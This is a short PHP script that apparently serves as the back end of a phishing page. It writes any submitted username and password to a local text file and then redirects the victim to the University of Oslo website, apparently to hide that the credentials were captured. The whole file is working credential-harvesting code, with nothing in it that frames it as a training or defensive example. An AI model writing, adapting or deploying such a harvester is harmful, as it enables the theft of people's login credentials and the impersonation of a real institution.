<?php
print 'Hello';
$file = fopen("your-password.txt","a");
if (isset($_POST["username"])){
    fwrite($file,$_POST["username"]);
    fwrite($file,":");
}
if (isset($_POST["password"])){
    fwrite($file,$_POST["password"]);
    fwrite($file,"\n");
}
fclose($file);
header("Location: https://www.uio.no");
die()
?>